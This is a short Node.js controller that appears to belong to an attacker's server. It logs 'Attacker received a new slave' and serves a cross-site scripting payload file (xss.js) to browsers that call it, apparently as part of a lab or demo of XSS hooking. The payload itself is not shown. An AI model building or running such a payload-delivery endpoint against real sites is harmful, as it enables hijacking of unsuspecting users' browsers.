const path = require("path");

exports.controller = function (req, res) {
    console.log("Attacker received a new slave");
    res.sendFile(path.join(__dirname + './../static/xss.js'));
};